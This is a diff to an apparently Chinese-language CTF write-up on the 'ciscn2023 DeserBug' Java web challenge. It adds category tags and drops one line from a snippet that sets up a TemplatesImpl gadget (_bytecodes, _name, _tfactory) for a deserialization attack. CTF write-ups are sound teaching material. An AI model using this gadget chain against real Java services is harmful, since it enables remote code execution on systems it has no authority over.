@@ -2,6 +2,8 @@
 layout: post
 title: ciscn2023 DeserBug
 date: 2023-05-29 16:29 +0800
+categories: [ctf, web]
+tag: [web, java]
 ---
 
 ## 题目描述
@@ -390,7 +392,6 @@ public class Test {
             TemplatesImpl obj = new TemplatesImpl();
             setFieldValue(obj, "_bytecodes", new byte[][]{classBytes});
             setFieldValue(obj, "_name", "1");
-            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
 
             Myexpect exp1 = new Myexpect();
             exp1.setTypeparam(new Class[]{javax.xml.transform.Templates.class});
